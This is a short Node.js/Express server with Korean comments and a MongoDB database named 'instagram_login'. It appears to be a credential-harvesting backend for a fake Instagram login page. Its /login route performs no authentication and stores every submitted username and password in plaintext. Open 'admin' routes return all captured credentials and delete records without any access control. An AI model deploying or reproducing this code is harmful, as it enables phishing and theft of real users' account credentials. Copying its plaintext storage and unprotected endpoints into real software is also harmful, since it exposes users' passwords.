const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();
const port = 3000;

// MongoDB 연결
mongoose.connect('mongodb://localhost:27017/instagram_login', {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log('Connected to MongoDB');
}).catch(err => {
    console.error('Failed to connect to MongoDB', err);
});

// Mongoose 스키마 및 모델 정의
const userSchema = new mongoose.Schema({
    username: String,
    password: String
});

const User = mongoose.model('User', userSchema);

// Body-parser 미들웨어 설정
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// 정적 파일 제공
app.use(express.static('public'));

// 로그인 데이터 처리
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // 새로운 사용자 생성 및 데이터베이스에 저장
    const newUser = new User({ username, password });

    try {
        await newUser.save();
        res.send('User saved successfully!');
    } catch (err) {
        res.status(500).send('Error saving user');
    }
});

// 모든 사용자 데이터 가져오기 (관리자 페이지용)
app.get('/api/users', async (req, res) => {
    try {
        const users = await User.find();
        res.json(users);
    } catch (err) {
        res.status(500).send('Error retrieving users');
    }
});

// 사용자 삭제 (관리자 페이지용)
app.delete('/api/users/:id', async (req, res) => {
    try {
        await User.findByIdAndDelete(req.params.id);
        res.json({ message: 'User deleted successfully' });
    } catch (err) {
        res.status(500).send('Error deleting user');
    }
});

// 서버 실행
app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
